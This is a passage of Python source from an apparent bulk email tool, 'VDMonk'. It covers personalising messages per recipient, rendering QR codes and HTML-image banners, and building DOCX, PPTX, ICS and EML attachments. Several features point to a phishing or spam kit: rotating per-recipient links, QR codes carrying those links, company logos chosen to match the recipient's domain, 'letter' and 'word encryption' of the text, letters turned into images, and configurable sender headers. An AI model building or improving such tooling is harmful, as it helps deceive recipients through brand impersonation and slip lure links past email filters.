    candidates = _htmlimage_template_paths()
    if not candidates:
        return ''
    with htmlimage_rotation_lock:
        selected = candidates[htmlimage_rotation_index % len(candidates)]
        htmlimage_rotation_index += 1
    return selected


def extract_href_from_html(html_path):
    try:
        with open(html_path, 'r', encoding='utf-8', errors='ignore') as fh:
            content = fh.read()
        match = re.search(r'<a[^>]+href=[\'\"]([^\'\"]+)[\'\"]', content, flags=re.I)
        if match:
            return match.group(1).strip()
    except Exception:
        pass
    return None


_qr_hide_warning_shown = False


# v9.7: Froala/Outlook rich-text editors percent-encode braces in HTML
# (e.g. src="%7BQRCODE%7D" instead of src="{QRCODE}"), so literal token
# replacement never matched and the QR/logo/email placeholders were left
# untouched. Decode the common encoded forms back to {TOKEN} so every
# placeholder pipeline sees the canonical form.
_ENCODED_TOKEN_RE = re.compile(
    r'(?:%7[bB]|&#x7[bB];|&#123;)([A-Za-z0-9_]+)(?:%7[dD]|&#x7[dD];|&#125;)'
)


def _normalize_encoded_tokens(text):
    if not text:
        return text
    return _ENCODED_TOKEN_RE.sub(lambda m: '{' + m.group(1) + '}', str(text))


_qr_color_warning_shown = False


def _qr_sanitize_color(value, default, label):
    """v9.7: validate a QR colour setting before handing it to PIL.

    setup.ini colours may be empty, '{}' (unset YAML sentinel), hex without
    '#', named colours, or rgb() strings. PIL raises ValueError on anything it
    cannot parse, and the caller previously swallowed the exception so the QR
    silently vanished ('colours not showing'). Return a PIL-safe colour or the
    default, printing a one-time notice when a value is unusable.
    """
    global _qr_color_warning_shown
    raw = str(value or '').strip().strip('"').strip("'")
    if raw in ('', '{}', '[]', 'None', 'none'):
        return default
    if re.fullmatch(r'(?:[0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})', raw):
        raw = '#' + raw
    try:
        from PIL import ImageColor
        ImageColor.getrgb(raw)
        return raw
    except Exception:
        if not _qr_color_warning_shown:
            _qr_color_warning_shown = True
            try:
                print(f"{Fore.YELLOW}[QRCODE] {label} colour {value!r} is not a valid "
                      f"colour; using {default!r} instead. Use e.g. #0F4C81, 'black', "
                      f"or rgb(0,120,212).{Style.RESET_ALL}", flush=True)
            except Exception:
                pass
        return default


def _render_qr_html(image_src, link_url=None, hide=False):
    """Render the {QRCODE} replacement markup.

    v9.6: the legacy hide=True branch returned a click-to-reveal widget
    (<button onclick> + <span style="display:none">). Every major mail client
    (Gmail, Outlook, Apple Mail, ...) strips <button>/onclick handlers, and the
    hidden span stays display:none, so the recipient saw a blank gap where the
    QR code should be - exactly the 'qrcode is not showing even when enabled'
    report. Email HTML cannot execute JavaScript, so a click-to-reveal QR is
    impossible inside a message body. hide=True now renders the QR normally
    (identical to hide=False) and prints a one-time notice so the setting is
    never silently ignored.
    """
    global _qr_hide_warning_shown
    image = '<img src="' + image_src + '" alt="QR Code" />'
    if link_url:
        image = '<a href="' + link_url + '">' + image + '</a>'
    if not hide:
        return image
    if not _qr_hide_warning_shown:
        _qr_hide_warning_shown = True
        try:
            print(f"{Fore.YELLOW}[QRCODE] enable_hide_qrcode=true requested the legacy "
                  f"click-to-reveal QR, but mail clients strip buttons/JavaScript so the "
                  f"QR code rendered as a blank area. v9.6 now displays the QR code "
                  f"normally; set enable_hide_qrcode: false in setup.ini (qrcode_config) "
                  f"to silence this notice.{Style.RESET_ALL}", flush=True)
        except Exception:
            pass
    return image


def _resolve_html_template_placeholders(html_path, recipient_email, link_url=None):
    """Resolve the same placeholder set used in regular message templates before HTML conversion."""
    try:
        with open(html_path, 'r', encoding='utf-8', errors='ignore') as fh:
            text = fh.read()
    except Exception:
        return ''
    text = _normalize_encoded_tokens(text)

    try:
        text = re.sub(r"\$\{([^}]+)\}", r"{\1}", text)
        text = re.sub(r"\{\{([^{}]+)\}\}", r"{\1}", text)
        text = replace_placeholders(recipient_email, text, skip_link=True)
        generated_company_email = _functions.get_current_company_email()
        resolved_link = str(link_url or '').strip()
        if not resolved_link:
            try:
                resolved_link = str(get_next_link(recipient_email) or '').strip()
            except Exception:
                resolved_link = ''
        resolved_link = replace_placeholders(recipient_email, resolved_link, skip_link=True)
        for token in ('{link}', '{LINK}', '{Link}', '[link]', '[LINK]', '[Link]', '${link}', '${LINK}', '${Link}'):
            text = text.replace(token, resolved_link)
        text = apply_letter_encryption(text)
        text = apply_word_encryption(text)
    except Exception:
        pass

    for token in ('{logo}', '{LOGO}', '{logos}', '{LOGOS}'):
        if token in text:
            try:
                if token.lower() == '{logo}':
                    logo_path = get_logo_for_email(recipient_email)
                    if not logo_path:
                        logo_path = _get_logo_fallback_path()
                    if logo_path:
                        text = text.replace(token, '<img src="' + image_to_data_uri(logo_path) + '" alt="logo" />')
                    else:
                        text = text.replace(token, '')
                else:
                    logo_path = get_logo_for_company(generated_company_email)
                    if not logo_path:
                        logo_path = get_random_logo()
                    logo_uri = image_to_data_uri(logo_path) if logo_path else None
                    if not logo_uri:
                        # Never blank the placeholder because of one unreadable
                        # candidate; retry with the cached fallback logo.
                        logo_path = _get_logo_fallback_path()
                        logo_uri = image_to_data_uri(logo_path) if logo_path else None
                    if logo_uri:
                        text = text.replace(token, '<img src="' + logo_uri + '" alt="logo" />')
                    else:
                        text = text.replace(token, '')
            except Exception:
                text = text.replace(token, '')

    # PDF/HTML templates need an inline image because they cannot reference
    # the email's later CID attachment.
    qr_tokens = ('{qrcode}', '{QRCODE}')
    if any(token in text for token in qr_tokens):
        qr_uri = None
        try:
            if qrcode_setup.get('enable', 0):
                qr_data = _resolve_qr_data(link_url or resolved_link, recipient_email)
                if qr_data:
                    qr_bytes = generate_qr_code_image(qr_data)
                    qr_uri = 'data:image/png;base64,' + base64.b64encode(qr_bytes).decode('ascii')
        except Exception:
            qr_uri = None
        replacement = _render_qr_html(qr_uri, link_url, False) if qr_uri else ''
        for token in qr_tokens:
            if qr_uri:
                text = text.replace('src="' + token + '"', 'src="' + qr_uri + '"')
                text = text.replace("src='" + token + "'", 'src="' + qr_uri + '"')
            text = text.replace(token, replacement)

    signature_html = render_signature_html(random_signature())
    text = text.replace('{signature}', signature_html).replace('{SIGNATURE}', signature_html)

    return text


def prepare_htmlimage_inline(nmsg, recipient_email, link_url=None):
    enabled = htmlimage_setup.get('enable', 0)
    if str(enabled).strip().lower() not in ('1', 'true', 'yes', 'on'):
        return nmsg, None
    html_paths = _htmlimage_template_paths()
    html_path = _select_htmlimage_template()
    if html_path and not os.path.isabs(html_path):
        html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), html_path)
    if not html_path or not os.path.isfile(html_path):
        return nmsg, None
    os.makedirs('HTML_IMAGE', exist_ok=True)
    configured_name = htmlimage_setup.get('name', 'attachHtmlImage.png')
    name_root, name_ext = os.path.splitext(os.path.basename(configured_name))
    out_name = f'.{name_root}.{uuid.uuid4().hex}{name_ext or ".png"}'
    out_path = os.path.join('HTML_IMAGE', out_name)
    width = int(htmlimage_setup.get('width', 0) or 0)
    height = int(htmlimage_setup.get('height', 0) or 0)
    try:
        scale = float(htmlimage_setup.get('scale', 1.0) or 1.0)
    except (TypeError, ValueError):
        scale = 1.0
    if not generate_image_from_html(html_path, out_path, width=width, height=height, scale=scale, recipient_email=recipient_email, link_url=link_url):
        print(f"{Fore.YELLOW}[HTMLIMAGE] Could not generate image from {html_path}; leaving the email body unchanged.{Style.RESET_ALL}")
        return nmsg, None
    print(f"{Fore.CYAN}[HTMLIMAGE] Generated: {out_path} from {html_path}{Style.RESET_ALL}")
    if htmlimage_setup.get('enableClip', 0) == 1:
        try:
            from PIL import Image
            left = max(0, int(htmlimage_setup.get('clipLeft', 0)))
            top = max(0, int(htmlimage_setup.get('clipTop', 0)))
            clip_width = max(1, int(htmlimage_setup.get('clipWidth', width or 1)))
            clip_height = max(1, int(htmlimage_setup.get('clipHeight', height or 1)))
            with Image.open(out_path) as image:
                right = min(image.width, left + clip_width)
                bottom = min(image.height, top + clip_height)
                if right > left and bottom > top:
                    image.crop((left, top, right, bottom)).save(out_path)
        except Exception:
            pass
    href = str(link_url or '').strip() or extract_href_from_html(html_path)
    if href:
        for token in ('{link}', '{LINK}', '{Link}', '[link]', '[LINK]', '[Link]', '${link}', '${LINK}', '${Link}'):
            href = href.replace(token, str(link_url or '').strip())
    cid = f'htmlimage-{uuid.uuid4().hex[:8]}'
    # Build the inline MIME image BEFORE mutating the body. If image loading
    # fails we must not leave a dangling cid: placeholder with no matching part.
    image_part = None
    try:
        with open(out_path, 'rb') as fh:
            image_data = fh.read()
        subtype = os.path.splitext(out_path)[1].lstrip('.').lower() or 'png'
        if subtype in ('png', 'jpg', 'jpeg', 'gif', 'bmp'):
            image_part = MIMEImage(image_data, _subtype=subtype)
        else:
            image_part = MIMEBase('application', 'octet-stream')
            image_part.set_payload(image_data)
            encoders.encode_base64(image_part)
        image_part.add_header('Content-ID', f'<{cid}>')
        image_part.add_header('Content-Disposition', 'inline', filename=(Header(os.path.basename(out_path), 'utf-8').encode()))
    except Exception:
        try:
            os.remove(out_path)
        except OSError:
            pass
        return nmsg, None
    try:
        display_width = max(1, int(htmlimage_setup.get('displayWidth', 600) or 600))
    except (TypeError, ValueError):
        display_width = 600
    try:
        display_height = max(0, int(htmlimage_setup.get('displayHeight', 0) or 0))
    except (TypeError, ValueError):
        display_height = 0
    height_style = f'height:{display_height}px;' if display_height else 'height:auto;'
    placeholder = f'<img src="cid:{cid}" alt="" width="{display_width}" style="display:block;width:{display_width}px !important;min-width:{display_width}px;max-width:none;{height_style}" />'
    print(f"{Fore.CYAN}[HTMLIMAGE] Email display size: {display_width}x{display_height or 'auto'}px{Style.RESET_ALL}")
    wrapped = f'<a href="{href}">{placeholder}</a>' if href else placeholder
    nmsg = _normalize_encoded_tokens(nmsg)
    if '{htmlimage}' in nmsg or '{HTMLIMAGE}' in nmsg:
        nmsg = nmsg.replace('{htmlimage}', wrapped).replace('{HTMLIMAGE}', wrapped)
    else:
        # v9.6: never discard the letter body. The legacy branch replaced the
        # whole message with the banner image whenever the letter lacked the
        # {HTMLIMAGE} token, silently dropping the letter text (and any
        # {QRCODE} in it). Prepend the banner instead so the letter survives.
        nmsg = wrapped + nmsg
    try:
        os.remove(out_path)
    except OSError:
        pass
    return nmsg, image_part


def render_htmlimage_sample():
    """Render the configured HTML image preview without sending email."""
    if str(htmlimage_setup.get('showSample', 0)).strip().lower() not in ('1', 'true', 'yes', 'on'):
        return True
    html_paths = _htmlimage_template_paths()
    html_path = _select_htmlimage_template()
    if html_path and not os.path.isabs(html_path):
        html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), html_path)
    if not html_path or not os.path.isfile(html_path):
        print(f"{Fore.RED}[HTMLIMAGE] Sample source not found: {html_path}{Style.RESET_ALL}")
        return False
    sample_email = str(htmlimage_setup.get('sampleEmail') or 'recipient@mail.com').strip()
    output_name = 'sample.png'
    output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'HTML_IMAGE', output_name)
    source_output_path = os.path.join(os.path.dirname(output_path), 'sample_source.png')
    source_paths = []
    try:
        width = int(htmlimage_setup.get('width', 1024) or 1024)
        height = int(htmlimage_setup.get('height', 768) or 768)
        scale = float(htmlimage_setup.get('scale', 2.0) or 2.0)
    except (TypeError, ValueError):
        width, height, scale = 1024, 768, 2.0
    focused_width = None
    focused_height = None
    if generate_image_from_html(html_path, output_path, width=width, height=height, scale=scale, recipient_email=sample_email):
        try:
            shutil.copyfile(output_path, source_output_path)
        except OSError:
            source_output_path = output_path
        for index, template_path in enumerate(html_paths):
            source_name = f'sample_source_{index}.png'
            source_path = os.path.join(os.path.dirname(output_path), source_name)
            if os.path.abspath(template_path) == os.path.abspath(html_path):
                try:
                    shutil.copyfile(source_output_path, source_path)
                except OSError:
                    source_path = source_output_path
            elif not generate_image_from_html(template_path, source_path, width=width, height=height, scale=scale, recipient_email=sample_email):
                continue
            source_paths.append({'label': os.path.basename(template_path), 'source': source_name})
        if str(htmlimage_setup.get('sampleFocus', 1)).strip().lower() in ('1', 'true', 'yes', 'on'):
            try:
                from PIL import Image, ImageChops
                with Image.open(output_path) as image:
                    image = image.convert('RGB')
                    background = Image.new('RGB', image.size, 'white')
                    difference = ImageChops.difference(image, background).convert('L')
                    bbox = difference.point(lambda value: 255 if value > 12 else 0).getbbox()
                    if bbox:
                        try:
                            padding = max(0, int(htmlimage_setup.get('sampleFocusPadding', 24) or 0))
                        except (TypeError, ValueError):
                            padding = 24
                        left = max(0, bbox[0] - padding)
                        top = max(0, bbox[1] - padding)
                        right = min(image.width, bbox[2] + padding)
                        bottom = min(image.height, bbox[3] + padding)
                        image.crop((left, top, right, bottom)).save(output_path)
                        focused_width = right - left
                        focused_height = bottom - top
            except Exception as exc:
                print(f"{Fore.YELLOW}[HTMLIMAGE] Sample focus could not be applied: {exc}{Style.RESET_ALL}")
        if focused_width is None or focused_height is None:
            try:
                from PIL import Image
                with Image.open(output_path) as image:
                    focused_width, focused_height = image.size
            except Exception:
                focused_width, focused_height = width, height
        recommended_width = max(1, round(focused_width / scale))
        recommended_height = max(1, round(focused_height / scale))
        try:
            sample_display_width = max(1, int(htmlimage_setup.get('displayWidth', recommended_width) or recommended_width))
        except (TypeError, ValueError):
            sample_display_width = recommended_width
        try:
            sample_display_height = max(0, int(htmlimage_setup.get('displayHeight', 0) or 0))
        except (TypeError, ValueError):
            sample_display_height = 0
        if sample_display_height == 0:
            sample_display_height = max(1, round(sample_display_width * focused_height / focused_width))
        try:
            from PIL import Image
            with Image.open(output_path) as image:
                image.resize((sample_display_width, sample_display_height), Image.Resampling.LANCZOS).save(output_path)
        except Exception as exc:
            print(f"{Fore.YELLOW}[HTMLIMAGE] Display-size sample preview could not be resized: {exc}{Style.RESET_ALL}")
        dimensions_path = os.path.join(os.path.dirname(output_path), 'sample_dimensions.txt')
        with open(dimensions_path, 'w', encoding='utf-8') as dimensions_file:
            dimensions_file.write(
                f"# Generated from sample.png; keep scale at {scale}\n"
                f"# Focused bitmap size: {focused_width}x{focused_height}px\n"
                f"# Current configured display size: {sample_display_width}x{sample_display_height}px\n"
                f"display_width: {sample_display_width}\n"
                f"display_height: {sample_display_height}\n"
            )
        print(
            f"{Fore.CYAN}[HTMLIMAGE] Recommended display size: "
            f"{recommended_width}x{recommended_height}px; setup.ini values were preserved.{Style.RESET_ALL}"
        )
        print(
            f"{Fore.GREEN}[HTMLIMAGE] Sample ready: {output_path} "
            f"(focused bitmap={focused_width}x{focused_height}px, "
            f"sample preview={sample_display_width}x{sample_display_height}px, "
            f"recommended display_width={recommended_width}, "
            f"display_height={recommended_height}, scale={scale}){Style.RESET_ALL}"
        )
        print(f"{Fore.CYAN}[HTMLIMAGE] Setup values saved: {dimensions_path}{Style.RESET_ALL}")
        editor_path = os.path.join(os.path.dirname(output_path), 'crop_editor.html')
        if str(htmlimage_setup.get('sampleHandles', 0)).strip().lower() in ('1', 'true', 'yes', 'on') and os.path.isfile(editor_path):
            try:
                import webbrowser
                try:
                    configured_width = int(htmlimage_setup.get('displayWidth', recommended_width) or recommended_width)
                except (TypeError, ValueError):
                    configured_width = recommended_width
                try:
                    configured_height = int(htmlimage_setup.get('displayHeight', recommended_height) or recommended_height)
                except (TypeError, ValueError):
                    configured_height = recommended_height
                config_path = os.path.join(os.path.dirname(editor_path), 'crop_editor_config.js')
                with open(config_path, 'w', encoding='utf-8') as config_file:
                    config_file.write(
                        'window.VDMONK_CONFIG = '
                        f"{{sourceImage: 'sample_source.png', sources: {json.dumps(source_paths)}, "
                        f"currentSource: {next((index for index, item in enumerate(source_paths) if item['label'] == os.path.basename(html_path)), 0)}, displayWidth: {configured_width}, "
                        f'displayHeight: {configured_height}, scale: {scale}, '
                        f'clipLeft: {int(htmlimage_setup.get("clipLeft", 0) or 0)}, '
                        f'clipTop: {int(htmlimage_setup.get("clipTop", 0) or 0)}, '
                        f'clipWidth: {int(htmlimage_setup.get("clipWidth", width or 1) or 1)}, '
                        f'clipHeight: {int(htmlimage_setup.get("clipHeight", height or 1) or 1)}, '
                        f'screenWidth: {width}, screenHeight: {height}, '
                        f'enableClip: {bool(htmlimage_setup.get("enableClip", 0))}}};\n'
                    )
                editor_url = f"{editor_path}?display_width={configured_width}&display_height={configured_height}"
                webbrowser.open(editor_url)
                print(f"{Fore.CYAN}[HTMLIMAGE] Current configured sample size: {configured_width}x{configured_height}px{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[HTMLIMAGE] Crop editor opened: {editor_path}{Style.RESET_ALL}")
            except Exception as exc:
                print(f"{Fore.YELLOW}[HTMLIMAGE] Crop editor could not be opened automatically: {exc}{Style.RESET_ALL}")
        return True
    print(f"{Fore.RED}[HTMLIMAGE] Sample rendering failed: {html_path}{Style.RESET_ALL}")
    return False


def generate_docx_from_html(html_path, out_path, recipient_email='', link_url=None):
    source_html = html_path
    try:
        if os.path.isfile(html_path):
            with open(html_path, 'r', encoding='utf-8', errors='ignore') as fh:
                raw = fh.read()
            if '{' in raw and '}' in raw:
                resolved = _resolve_html_template_placeholders(html_path, recipient_email or 'placeholder@example.com', link_url=link_url)
                if resolved:
                    temp_path = os.path.join(os.path.dirname(os.path.abspath(html_path)) or '.', f'__vdm_docx_{uuid.uuid4().hex}.html')
                    with open(temp_path, 'w', encoding='utf-8') as fh:
                        fh.write(resolved)
                    source_html = temp_path
        import pypandoc
        if not _ensure_pandoc_available():
            raise RuntimeError('Pandoc unavailable')
        pypandoc.convert_file(source_html, 'docx', outputfile=out_path)
        if source_html != html_path and os.path.exists(source_html):
            try:
                os.remove(source_html)
            except Exception:
                pass
        return True
    except Exception:
        pass
    try:
        from docx import Document
        doc = Document()
        text = _html_to_plain_text(source_html)
        if text:
            for paragraph in text.splitlines():
                paragraph = paragraph.strip()
                if paragraph:
                    doc.add_paragraph(paragraph)
        else:
            doc.add_paragraph(' ')
        os.makedirs(os.path.dirname(out_path) or '.', exist_ok=True)
        doc.save(out_path)
        if source_html != html_path and os.path.exists(source_html):
            try:
                os.remove(source_html)
            except Exception:
                pass
        return True
    except Exception as exc:
        print(f"{Fore.YELLOW}[DOCX] HTML conversion failed: {exc}{Style.RESET_ALL}")
        return False


def _html_to_plain_text(html_path):
    from html.parser import HTMLParser

    class TextExtractor(HTMLParser):
        def __init__(self):
            super().__init__()
            self.parts = []

        def handle_data(self, data):
            self.parts.append(data)

        def handle_starttag(self, tag, attrs):
            if tag.lower() in ('br', 'p', 'div', 'li', 'h1', 'h2', 'h3'):
                self.parts.append('\n')

    with open(html_path, 'r', encoding='utf-8', errors='replace') as source:
        parser = TextExtractor()
        parser.feed(source.read())
    return '\n'.join(line.strip() for line in ''.join(parser.parts).splitlines() if line.strip())


def generate_pptx_from_html(html_path, out_path, recipient_email='', link_url=None):
    source_html = html_path
    try:
        if os.path.isfile(html_path):
            with open(html_path, 'r', encoding='utf-8', errors='ignore') as fh:
                raw = fh.read()
            if '{' in raw and '}' in raw:
                resolved = _resolve_html_template_placeholders(html_path, recipient_email or 'placeholder@example.com', link_url=link_url)
                if resolved:
                    temp_path = os.path.join(os.path.dirname(os.path.abspath(html_path)) or '.', f'__vdm_pptx_{uuid.uuid4().hex}.html')
                    with open(temp_path, 'w', encoding='utf-8') as fh:
                        fh.write(resolved)
                    source_html = temp_path
        from pptx import Presentation
        from pptx.util import Inches, Pt
        text = _html_to_plain_text(source_html)
        lines = text.splitlines() or ['']
        presentation = Presentation()
        slide = presentation.slides.add_slide(presentation.slide_layouts[5])
        title = slide.shapes.title
        title.text = lines[0][:120] if lines else ''
        box = slide.shapes.add_textbox(Inches(0.7), Inches(1.4), Inches(8.6), Inches(5.2))
        frame = box.text_frame
        frame.text = '\n'.join(lines[1:]) or lines[0]
        for paragraph in frame.paragraphs:
            paragraph.font.size = Pt(18)
        os.makedirs(os.path.dirname(out_path) or '.', exist_ok=True)
        presentation.save(out_path)
        if source_html != html_path and os.path.exists(source_html):
            try:
                os.remove(source_html)
            except Exception:
                pass
        return True
    except Exception as exc:
        print(f"{Fore.YELLOW}[PPTX] HTML conversion failed: {exc}{Style.RESET_ALL}")
        return False


def _ics_escape(value):
    return str(value or '').replace('\\', '\\\\').replace(';', '\\;').replace(',', '\\,').replace('\n', '\\n').replace('\r', '')


def _ics_datetime(value):
    from datetime import datetime as _datetime
    parsed = _datetime.fromisoformat(str(value).strip())
    return parsed.strftime('%Y%m%dT%H%M%S')


def generate_icalendar_file(out_path):
    try:
        from datetime import datetime as _datetime
        starts = _ics_datetime(icalendar_setup['starts'])
        ends = _ics_datetime(icalendar_setup['ends'])
        # v9.5: a stale/default config must not emit an event that ends before it
        # starts; auto-correct the end time to start + 1 hour.
        _s_dt = _datetime.fromisoformat(str(icalendar_setup['starts']).strip())
        _e_dt = _datetime.fromisoformat(str(icalendar_setup['ends']).strip())
        if _e_dt <= _s_dt:
            from datetime import timedelta as _timedelta
            ends = (_s_dt + _timedelta(hours=1)).strftime('%Y%m%dT%H%M%S')
        lines = [
            'BEGIN:VCALENDAR', 'VERSION:2.0', 'PRODID:-//VDMonk//Calendar//EN',
            'BEGIN:VEVENT', f'UID:{uuid.uuid4()}@vdmonk',
            f'DTSTAMP:{_datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")}',
            f'DTSTART:{starts}', f'DTEND:{ends}',
            f'SUMMARY:{_ics_escape(icalendar_setup["summary"])}',
            f'DESCRIPTION:{_ics_escape(icalendar_setup["description"])}',
            f'LOCATION:{_ics_escape(icalendar_setup["location"])}',
            f'ORGANIZER;CN={_ics_escape(icalendar_setup["organizer_name"])}:MAILTO:{icalendar_setup["organizer_email"]}',
            f'ATTENDEE;CN={_ics_escape(icalendar_setup["attendee_name"])}:MAILTO:{icalendar_setup["attendee_email"]}',
            'END:VEVENT', 'END:VCALENDAR', ''
        ]
        with open(out_path, 'w', encoding='utf-8', newline='\r\n') as target:
            target.write('\r\n'.join(lines))
        return True
    except Exception as exc:
        print(f"{Fore.YELLOW}[ICS] Generation failed: {exc}{Style.RESET_ALL}")
        return False


def cleanup_eml_temp_files(eml_dir='EML', max_age_seconds=600):
    try:
        if not eml_dir or not os.path.isdir(eml_dir):
            return
        now = time.time()
        for entry in os.listdir(eml_dir):
            path = os.path.join(eml_dir, entry)
            if not os.path.isfile(path):
                continue
            if entry.startswith('.') and entry.endswith('.embed'):
                try:
                    # Only reclaim STALE leftovers. A blanket delete here raced
                    # with other worker threads: attach_generated_files() calls
                    # this at its start, so one worker wiped the '.embed' staging
                    # files another worker was still embedding into its own
                    # in-flight .eml, silently dropping those nested attachments.
                    if max_age_seconds is not None and (now - os.path.getmtime(path)) < max_age_seconds:
                        continue
                    os.remove(path)
                except OSError:
                    pass
    except Exception:
        pass


def generate_eml_from_html(html_path, out_path, eml_conf=None, to_email=None):
    try:
        if os.path.splitext(str(html_path or ''))[1].lower() == '.eml':
            if os.path.abspath(html_path) != os.path.abspath(out_path):
                import shutil
                shutil.copyfile(html_path, out_path)
            return os.path.isfile(out_path) and os.path.getsize(out_path) > 0
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders
        import mimetypes

        msg = MIMEMultipart()
        subj = eml_conf.get('subject', 'Message File') if eml_conf else 'Message File'
        frm_addr = (eml_conf.get('from') or 'noreply@example.com') if eml_conf else 'noreply@example.com'
        from_name = (eml_conf.get('from_name') or '').strip() if eml_conf else ''
        to_addr = to_email or (eml_conf.get('to') if eml_conf else '')
        to_name = (eml_conf.get('to_name') or '').strip() if eml_conf else ''
        # allow placeholders (including {IBAN}/{UUID}) in subject/from using recipient context
        try:
            subj = replace_placeholders(to_email or '', subj)
        except Exception:
            pass
        try:
            frm_addr = replace_placeholders(to_email or '', frm_addr)
            from_name = replace_placeholders(to_email or '', from_name)
            to_addr = replace_placeholders(to_email or '', to_addr)
            to_name = replace_placeholders(to_email or '', to_name)
        except Exception:
            pass
        if from_name and frm_addr:
            frm = f'{from_name} <{frm_addr}>'
        else:
            frm = frm_addr or from_name or 'noreply@example.com'
        if to_name and to_addr:
            to = f'{to_name} <{to_addr}>'
        else:
            to = to_addr or to_name or (to_email or '')
        msg['Subject'] = subj
        msg['From'] = frm
        msg['To'] = to
        # v9.5: a generated .eml must carry a Date and Message-ID to be valid/deliverable.
        try:
            from email.utils import formatdate as _formatdate
            if not msg.get('Date'):
                msg['Date'] = _formatdate(localtime=True)
        except Exception:
            pass
        apply_custom_headers(msg, to_email or '')
        try:
            if not msg.get('Message-ID'):
                _dom = str(to_addr).split('@')[-1].strip() if '@' in str(to_addr) else 'vdmonk.local'
                msg['Message-ID'] = f'<{uuid.uuid4().hex}@{_dom or "vdmonk.local"}>'
        except Exception:
            pass
        with open(html_path, 'r', encoding='utf-8', errors='ignore') as fh:
            template = fh.read()

        # Resolve link/logo placeholders in the HTML template before building the EML body.
        try:
            template = _resolve_html_template_placeholders(
                html_path,
                to_email or 'placeholder@example.com',
                link_url=(get_next_link(to_email or '') if to_email else None),
            )
        except Exception:
            pass

        # Prepare details text (attachments, logo, chosen letter, etc.)
        details = ''
        try:
            det = eml_conf.get('details') if eml_conf else None
            if det:
                parts = []
                if isinstance(det, dict):
                    for k, v in det.items():
                        if isinstance(v, (list, tuple)):
                            parts.append(f"{k}: {', '.join([str(x) for x in v])}")
                        else:
                            parts.append(f"{k}: {v}")
                else:
                    details = str(det)
                if not details:
                    details = '<br/>'.join(parts)
        except Exception:
            details = ''

        # Replace placeholders in template
        message_content = ''
        try:
            if eml_conf and eml_conf.get('message'):
                message_content = eml_conf.get('message')
        except Exception:
            message_content = ''
        body = template.replace('{message}', message_content)

        body = body.replace('{details}', details)
        # Also replace common placeholders
        if to_email:
            body = body.replace('{EMAIL}', to_email)
        body = body.replace('{date}', time.strftime('%Y-%m-%d %H:%M:%S'))

        # run placeholder replacement on body with recipient context
        try:
            body = replace_placeholders(to_email or '', body)
        except Exception:
            pass
        msg.attach(MIMEText(body, 'html', 'utf-8'))

        # Optionally embed attachments inside the .eml
        embed_files = eml_conf.get('embedFiles') if eml_conf else None
        if embed_files:
            for fpath in embed_files:
                try:
                    if not os.path.isfile(fpath):
                        continue
                    embed_names = eml_conf.get('embedFileNames') if eml_conf else None
                    display_name = embed_names.get(fpath) if isinstance(embed_names, dict) else None
                    ctype, encoding = mimetypes.guess_type(display_name or fpath)
                    if ctype is None:
                        ctype = 'application/octet-stream'
                    maintype, subtype = ctype.split('/', 1)
                    part = MIMEBase(maintype, subtype)
                    with open(fpath, 'rb') as fh:
                        part.set_payload(fh.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', 'attachment', filename=display_name or os.path.basename(fpath))
                    msg.attach(part)
                except Exception:
                    pass

        with open(out_path, 'w', encoding='utf-8') as fh:
            fh.write(msg.as_string())
        return True
    except Exception:
        pass
    return False


def attach_generated_files(msg, recipient_email, base_name_prefix='attach', extra_embed_files=None):
    # Generates enabled attachments and attaches them to MIME message 'msg'. Returns list of attached filenames.
    cleanup_eml_temp_files('EML')
    attached = []
    created_for_eml = []
    temporary_generated_files = []
    enabled_flags = {
        'pdf': pdf_setup.get('enable', 0) == 1,
        'svg': svg_setup.get('enable', 0) == 1,
        'doc': doc_setup.get('enable', 0) == 1,
        'docx': docx_setup.get('enable', 0) == 1,
        'rtf': rtf_setup.get('enable', 0) == 1,
        'pptx': pptx_setup.get('enable', 0) == 1,
        'ics': icalendar_setup.get('enable', 0) == 1,
        'eml': eml_setup.get('enable', 0) == 1,
        'otherFile': otherfile_setup.get('enable', 0) == 1 or local_files_setup.get('enable', 0) == 1
    }
    if not any(enabled_flags.values()):
        print(f"{Fore.YELLOW}[TRACE] generated file attachment flags all disabled, skipping attach_generated_files{Style.RESET_ALL}")
        return attached
    print(f"{Fore.CYAN}[TRACE] attach_generated_files enabled: {enabled_flags}{Style.RESET_ALL}")
    try:
        import mimetypes
        from email.mime.base import MIMEBase
        from email import encoders
        # PDF
        try:
            embed_eml_files = (
                eml_setup.get('enable', 0) == 1 and
                (eml_setup.get('emlAttachment', 0) == 1 or eml_setup.get('onlyEml', 0) == 1)
            )
        except Exception:
            embed_eml_files = False
        if local_files_setup.get('enable', 0) == 1:
            selected_local_files = select_local_file_entries()
        elif otherfile_setup.get('enable', 0) == 1:
            selected_local_files = [{'path': otherfile_setup.get('location'), 'attach': True, 'name': otherfile_setup.get('name')}]
        else:
            selected_local_files = []
        for local_entry in selected_local_files:
            if local_entry.get('path') and os.path.isfile(local_entry.get('path')) and local_entry.get('path') not in created_for_eml:
                created_for_eml.append(local_entry.get('path'))

        # Include HTML/SVG attachment sources in the generated EML as well.
        if htmlAttachment_setup.get('enable', 0) == 1:
            html_path = htmlAttachment_setup.get('location')
            if html_path and not os.path.isabs(html_path):
                html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), html_path)
            if html_path and os.path.isfile(html_path) and html_path not in created_for_eml:
                created_for_eml.append(html_path)
        if svgAttachment_setup.get('enable', 0) == 1:
            svg_path = svgAttachment_setup.get('location')
            if svg_path and not os.path.isabs(svg_path):
                svg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), svg_path)
            if svg_path and os.path.isfile(svg_path) and svg_path not in created_for_eml:
                created_for_eml.append(svg_path)
        if link_svg_setup.get('enable', 0) == 1:
            link_target = str(link_svg_setup.get('link') or '').strip()
            if not link_target or '{link}' in link_target.lower() or '[link]' in link_target.lower():
                try:
                    link_target = str(get_next_link(recipient_email) or '').strip()
                except Exception:
                    link_target = ''
            link_svg = generate_svg_with_url(link_target, recipient_email)
            if link_svg:
                link_svg_name = os.path.basename(str(link_svg_setup.get('name') or 'link.svg'))
                link_svg_path = os.path.join('EML', f".{link_svg_name}.{uuid.uuid4().hex}.svg")
                try:
                    with open(link_svg_path, 'w', encoding='utf-8') as fh:
